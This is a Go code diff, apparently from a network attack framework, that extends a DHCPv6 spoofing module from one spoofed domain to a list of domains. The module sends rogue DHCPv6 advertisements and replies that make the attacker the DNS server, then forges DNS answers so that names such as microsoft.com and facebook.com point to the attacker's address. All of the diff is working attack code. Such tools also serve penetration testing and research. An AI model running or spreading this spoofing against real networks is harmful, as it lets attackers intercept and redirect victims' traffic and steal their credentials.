@@ -25,11 +25,12 @@ import (
 
 type DHCP6Spoofer struct {
 	session.SessionModule
-	Handle  *pcap.Handle
-	DUID    *dhcp6opts.DUIDLLT
-	DUIDRaw []byte
-	Domain  string
-	Address net.IP
+	Handle     *pcap.Handle
+	DUID       *dhcp6opts.DUIDLLT
+	DUIDRaw    []byte
+	Domains    []string
+	RawDomains []byte
+	Address    net.IP
 }
 
 func NewDHCP6Spoofer(s *session.Session) *DHCP6Spoofer {
@@ -38,15 +39,15 @@ func NewDHCP6Spoofer(s *session.Session) *DHCP6Spoofer {
 		Handle:        nil,
 	}
 
-	spoof.AddParam(session.NewStringParameter("dhcp6.spoof.domain",
-		"microsoft.com",
+	spoof.AddParam(session.NewStringParameter("dhcp6.spoof.domains",
+		"microsoft.com, goole.com, facebook.com, apple.com, twitter.com",
 		``,
-		"Domain name to spoof."))
+		"Comma separated values of domain names to spoof."))
 
 	spoof.AddParam(session.NewStringParameter("dhcp6.spoof.address",
 		session.ParamIfaceAddress,
 		`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`,
-		"IP address to map the domain to."))
+		"IP address to map the domains to."))
 
 	spoof.AddHandler(session.NewModuleHandler("dhcp6.spoof on", "",
 		"Start the DHCPv6 spoofer in the background.",
@@ -88,8 +89,37 @@ func (s *DHCP6Spoofer) Configure() error {
 		return err
 	}
 
-	if err, s.Domain = s.StringParam("dhcp6.spoof.domain"); err != nil {
+	s.Domains = make([]string, 0)
+	if err, domains := s.StringParam("dhcp6.spoof.domains"); err != nil {
 		return err
+	} else {
+		parts := strings.Split(domains, ",")
+		totLen := 0
+		for _, part := range parts {
+			part = strings.Trim(part, "\t\n\r ")
+			if part != "" {
+				s.Domains = append(s.Domains, part)
+				totLen += len(part)
+			}
+		}
+
+		if totLen > 0 {
+			s.RawDomains = make([]byte, totLen+1*len(s.Domains))
+			i := 0
+			for _, domain := range s.Domains {
+				lenDomain := len(domain)
+				plusOne := lenDomain + 1
+
+				s.RawDomains[i] = byte(lenDomain & 0xff)
+				k := 0
+				for j := i + 1; j < plusOne; j++ {
+					s.RawDomains[j] = domain[k]
+					k++
+				}
+
+				i += plusOne
+			}
+		}
 	}
 
 	if err, addr = s.StringParam("dhcp6.spoof.address"); err != nil {
@@ -107,38 +137,15 @@ func (s *DHCP6Spoofer) Configure() error {
 	return nil
 }
 
-const DHCP6OptDNSServers = 23
-const DHCP6OptDNSDomains = 24
-const DHCP6OptClientFQDN = 39
-
-// link-local
-const IPv6Prefix = "fe80::"
-
-type DHCPv6Layer struct {
-	Raw []byte
-}
-
-func (l DHCPv6Layer) SerializeTo(b gopacket.SerializeBuffer, opts gopacket.SerializeOptions) error {
-	size := len(l.Raw)
-
-	bytes, err := b.PrependBytes(size)
-	if err != nil {
-		return err
-	}
-
-	copy(bytes, l.Raw)
-	return nil
-}
-
 func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, target net.HardwareAddr) {
 	pktIp6 := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
 
 	fqdn := target.String()
-	if raw, found := solicit.Options[DHCP6OptClientFQDN]; found == true && len(raw) >= 1 {
+	if raw, found := solicit.Options[packets.DHCP6OptClientFQDN]; found == true && len(raw) >= 1 {
 		fqdn = string(raw[0])
 	}
 
-	log.Info("Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %s.", core.Bold(fqdn), target, core.Bold(s.Domain))
+	log.Info("Got DHCPv6 Solicit request from %s (%s), sending spoofed advertisement for %d domains.", core.Bold(fqdn), target, len(s.Domains))
 
 	var solIANA dhcp6opts.IANA
 
@@ -156,10 +163,8 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 		Options:       make(dhcp6.Options),
 	}
 
-	lenDomain := len(s.Domain)
-	rawDomain := append([]byte{byte(lenDomain & 0xff)}, []byte(s.Domain)...)
-	adv.Options.AddRaw(DHCP6OptDNSDomains, rawDomain)
-	adv.Options.AddRaw(DHCP6OptDNSServers, s.Session.Interface.IPv6)
+	adv.Options.AddRaw(packets.DHCP6OptDNSDomains, s.RawDomains)
+	adv.Options.AddRaw(packets.DHCP6OptDNSServers, s.Session.Interface.IPv6)
 	adv.Options.AddRaw(dhcp6.OptionServerID, s.DUIDRaw)
 
 	var rawCID []byte
@@ -179,7 +184,7 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 		rand.Read(ip)
 	}
 
-	addr := fmt.Sprintf("%s%s", IPv6Prefix, strings.Replace(ip.String(), ".", ":", -1))
+	addr := fmt.Sprintf("%s%s", packets.IPv6Prefix, strings.Replace(ip.String(), ".", ":", -1))
 
 	iaaddr, err := dhcp6opts.NewIAAddr(net.ParseIP(addr), 300*time.Second, 300*time.Second, nil)
 	if err != nil {
@@ -230,7 +235,7 @@ func (s *DHCP6Spoofer) dhcpAdvertise(pkt gopacket.Packet, solicit dhcp6.Packet, 
 
 	udp.SetNetworkLayerForChecksum(&ip6)
 
-	final := DHCPv6Layer{
+	final := packets.DHCPv6Layer{
 		Raw: rawAdv,
 	}
 
@@ -265,10 +270,8 @@ func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.P
 	}
 	reply.Options.AddRaw(dhcp6.OptionClientID, rawCID)
 	reply.Options.AddRaw(dhcp6.OptionServerID, s.DUIDRaw)
-	reply.Options.AddRaw(DHCP6OptDNSServers, s.Session.Interface.IPv6)
-	lenDomain := len(s.Domain)
-	rawDomain := append([]byte{byte(lenDomain & 0xff)}, []byte(s.Domain)...)
-	reply.Options.AddRaw(DHCP6OptDNSDomains, rawDomain)
+	reply.Options.AddRaw(packets.DHCP6OptDNSServers, s.Session.Interface.IPv6)
+	reply.Options.AddRaw(packets.DHCP6OptDNSDomains, s.RawDomains)
 
 	var reqIANA dhcp6opts.IANA
 	if raw, found := req.Options[dhcp6.OptionIANA]; found == false || len(raw) < 1 {
@@ -323,7 +326,7 @@ func (s *DHCP6Spoofer) dhcpReply(toType string, pkt gopacket.Packet, req dhcp6.P
 
 	udp.SetNetworkLayerForChecksum(&ip6)
 
-	final := DHCPv6Layer{
+	final := packets.DHCPv6Layer{
 		Raw: rawAdv,
 	}
 
@@ -418,6 +421,15 @@ func (s *DHCP6Spoofer) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp
 	}
 }
 
+func (s *DHCP6Spoofer) shouldSpoof(domain string) bool {
+	for _, d := range s.Domains {
+		if strings.HasSuffix(domain, d) == true {
+			return true
+		}
+	}
+	return false
+}
+
 func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
 	var dhcp dhcp6.Packet
 	var err error
@@ -458,7 +470,7 @@ func (s *DHCP6Spoofer) onPacket(pkt gopacket.Packet) {
 		if parsed == true && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
 			for _, q := range dns.Questions {
 				qName := string(q.Name)
-				if strings.HasSuffix(qName, s.Domain) == true {
+				if s.shouldSpoof(qName) == true {
 					s.dnsReply(pkt, eth, udp, qName, dns, eth.SrcMAC)
 					break
 				} else {
